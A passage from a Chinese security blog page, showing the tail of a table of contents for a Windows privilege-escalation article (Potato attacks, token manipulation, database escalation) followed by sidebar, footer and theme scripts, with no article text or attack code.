class="toc-text">程序 incognito.exe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#invoke-tokenmanipulationps1%E8%84%9A%E6%9C%AC"><span class="toc-number">7.3.</span> <span class="toc-text">Invoke-TokenManipulation.ps1脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf%E6%A8%A1%E5%9D%97"><span class="toc-number">7.4.</span> <span class="toc-text">MSF模块</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-potato%E6%8F%90%E6%9D%83"><span class="toc-number">8.</span> <span class="toc-text">0x08 Potato提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">8.1.</span> <span class="toc-text">基本知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%9C%8D%E5%8A%A1%E7%9A%84%E7%99%BB%E5%BD%95%E8%B4%A6%E6%88%B7"><span class="toc-number">8.1.1.</span> <span class="toc-text">Windows服务的登录账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows-token"><span class="toc-number">8.1.2.</span> <span class="toc-text">Windows Token</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hot-potato"><span class="toc-number">8.2.</span> <span class="toc-text">Hot Potato</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">8.2.1.</span> <span class="toc-text">影响范围</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nbns%E5%8D%8F%E8%AE%AE"><span class="toc-number">8.2.2.</span> <span class="toc-text">NBNS协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#nbns-%E6%AC%BA%E9%AA%97"><span class="toc-number">8.2.2.1.</span> <span class="toc-text">NBNS 欺骗</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wpad-%E4%BB%A3%E7%90%86"><span class="toc-number">8.2.3.</span> <span class="toc-text">WPAD 代理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-gt-smb-ntlm-relay"><span class="toc-number">8.2.4.</span> <span class="toc-text">HTTP -&gt; SMB NTLM Relay</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">8.2.5.</span> <span class="toc-text">攻击流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rottenpotato-amp-juicypotato"><span class="toc-number">8.3.</span> <span class="toc-text">RottenPotato &amp; JuicyPotato</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">8.3.0.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">8.3.0.2.</span> <span class="toc-text">攻击流程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#printspoofer-pipepotato-or-badpotato"><span class="toc-number">8.4.</span> <span class="toc-text">PrintSpoofer (PipePotato or BadPotato)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">8.4.1.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#roguepotato"><span class="toc-number">8.5.</span> <span class="toc-text">RoguePotato</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">8.5.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">8.5.2.</span> <span class="toc-text">攻击流程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sweetpotato"><span class="toc-number">8.6.</span> <span class="toc-text">SweetPotato</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ghost-potato"><span class="toc-number">8.7.</span> <span class="toc-text">Ghost potato</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">8.7.1.</span> <span class="toc-text">原理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x09-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83"><span class="toc-number">9.</span> <span class="toc-text">0x09 数据库提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E6%8F%90%E6%9D%83"><span class="toc-number">9.1.</span> <span class="toc-text">MySQL提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BEroot%E5%AF%86%E7%A0%81"><span class="toc-number">9.1.1.</span> <span class="toc-text">查找root密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E6%8F%90%E6%9D%83"><span class="toc-number">9.2.</span> <span class="toc-text">Mysql提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x10-%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E6%8F%90%E6%9D%83"><span class="toc-number">10.</span> <span class="toc-text">0x10 其他类型提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#at%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-number">10.1.</span> <span class="toc-text">at命令提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83"><span class="toc-number">10.1.1.</span> <span class="toc-text">本地提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E5%90%88msf%E6%8F%90%E6%9D%83"><span class="toc-number">10.1.2.</span> <span class="toc-text">配合MSF提权</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sc%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83"><span class="toc-number">10.2.</span> <span class="toc-text">sc命令提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x11-%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">11.</span> <span class="toc-text">0x11 常用工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x12-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">12.</span> <span class="toc-text">0x12 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

